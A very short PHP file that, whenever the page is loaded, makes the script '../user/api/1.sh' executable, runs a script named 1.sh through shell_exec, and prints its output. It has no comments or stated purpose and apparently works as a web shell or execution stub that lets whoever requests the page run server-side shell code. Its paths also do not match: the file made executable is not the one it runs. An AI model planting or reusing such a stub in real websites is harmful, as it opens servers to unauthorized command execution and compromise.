<?php
$command = 'chmod +x ../user/api/1.sh && ./1.sh';
$output = shell_exec($command);
echo "<pre>$output</pre>";
?>
